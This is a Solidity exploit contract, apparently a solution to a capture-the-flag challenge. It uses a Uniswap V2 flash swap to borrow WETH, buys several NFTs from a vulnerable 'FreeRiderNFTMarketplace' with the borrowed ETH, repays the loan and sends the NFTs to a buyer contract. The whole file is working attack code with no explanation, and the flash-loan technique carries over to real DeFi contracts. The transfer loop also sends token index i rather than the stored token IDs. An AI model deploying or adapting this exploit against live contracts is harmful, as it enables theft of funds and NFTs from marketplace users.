// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "./FreeRiderNFTMarketplace.sol";

interface IUniswapV2Callee {
    function uniswapV2Call(
        address sender,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) external;
}

// forked from https://solidity-by-example.org/defi/uniswap-v2-flash-swap/
// follow him @ProgrammerSmart on twitter
contract FlashSwapAttacker is IUniswapV2Callee, IERC721Receiver {
    address private uniV2Factory;
    address payable private marketplace;
    address payable private buyerContract;

    address private DVT;
    address private WETH;

    IUniswapV2Factory private factory;

    IWETH private weth;

    IUniswapV2Pair private immutable pair;
    IERC721 private immutable nft;

    // For this example, store the amount to repay
    uint256 public amountToRepay;
    uint256[] public tokenIds;

    constructor(
        uint256[] memory _tokenIds,
        address payable _buyerContract,
        address _nft,
        address payable _marketplace,
        address _uniV2Factory,
        address _dvt,
        address _weth
    ) {
        tokenIds = _tokenIds;
        buyerContract = _buyerContract;
        nft = IERC721(_nft);
        marketplace = _marketplace;
        uniV2Factory = _uniV2Factory;
        factory = IUniswapV2Factory(_uniV2Factory);
        DVT = _dvt;
        WETH = _weth;
        weth = IWETH(_weth);
        pair = IUniswapV2Pair(factory.getPair(DVT, WETH));
    }

    function flashSwap(uint256 wethAmount) external {
        // Need to pass some data to trigger uniswapV2Call
        bytes memory data = abi.encode(WETH, msg.sender);

        /*------ONLY ON CONSOLE-LOGGING THE AMOUNTS RECEIVED IN uniswapV2Call(),
        CAN WE FIND OUT, which of WETH or DVT correspond to 
        amount0Out or amount1Out----------------------------------------------*/
        // amount0Out is WETH, amount1Out is DVT
        pair.swap(wethAmount, 0, address(this), data);
    }

    // This function is called by the DVT/WETH pair contract
    // ** CONSOLE-LOG AMOUNTS received properly, to figure out,
    // which of the 2 tokens correspond to amount0 and amount1 **
    function uniswapV2Call(
        address sender,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) external {
        require(msg.sender == address(pair), "not pair");
        require(sender == address(this), "not sender");
        assert(msg.sender == address(pair)); // ensure that msg.sender is a V2 pair

        (address tokenBorrow, address caller) = abi.decode(
            data,
            (address, address)
        );

        //######## DO NOTE THAT WETH/DVT pair contract sends WETH and NOT ETH ################
        // convert WETH received from pair, to ETH
        weth.withdraw(amount0);

        // Your custom code would go here. For example, code to arbitrage.
        require(tokenBorrow == WETH, "token borrow != WETH");
        FreeRiderNFTMarketplace(marketplace).buyMany{value: amount0}(tokenIds);

        // convert ETH back to WETH
        weth.deposit{value: amount0}();

        // about 0.3% fee, +1 to round up
        uint256 fee = (amount0 * 3) / 997 + 1;
        amountToRepay = amount0 + fee;

        // Transfer flash swap fee from caller
        weth.transferFrom(caller, address(this), fee);

        // Repay
        weth.transfer(address(pair), amountToRepay);
    }

    function sendNFTsToBuyerContract() external {
        for (uint256 i = 0; i < tokenIds.length; ++i) {
            nft.safeTransferFrom(address(this), buyerContract, i);
        }
    }

    // Read https://eips.ethereum.org/EIPS/eip-721 for more info on this function
    function onERC721Received(
        address,
        address,
        uint256 _tokenId,
        bytes memory
    ) external override returns (bytes4) {
        require(nft.ownerOf(_tokenId) == address(this));

        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}

interface IUniswapV2Pair {
    function swap(
        uint256 amount0Out,
        uint256 amount1Out,
        address to,
        bytes calldata data
    ) external;
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB)
        external
        view
        returns (address pair);
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

interface IWETH is IERC20 {
    function deposit() external payable;

    function withdraw(uint256 amount) external;
}
